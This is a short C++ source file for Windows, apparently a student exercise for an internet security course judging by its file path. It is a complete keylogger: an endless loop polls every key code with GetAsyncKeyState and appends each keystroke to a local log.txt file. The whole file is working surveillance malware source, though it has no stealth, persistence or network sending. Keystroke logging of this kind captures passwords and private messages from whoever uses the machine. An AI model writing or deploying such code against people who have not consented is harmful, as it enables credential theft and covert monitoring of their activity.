#include<iostream>
#include<windows.h>
#include<fstream>

using namespace std;

void save_in_file(const char x)
{
    ofstream myfile;
    myfile.open("C:/My Folder/6IT/ISS(Internet Security)/PR/log.txt",ios_base::app);
    myfile<<x;
    myfile<<"";
    myfile.close();
}
int main()
{
    while(1)
    {
        for(int i=0;i<255;i++)
        {
            if(GetAsyncKeyState((char)i)&0x0001)
            {
                save_in_file((char)i);
            }
        }
    }
    return 0;
}
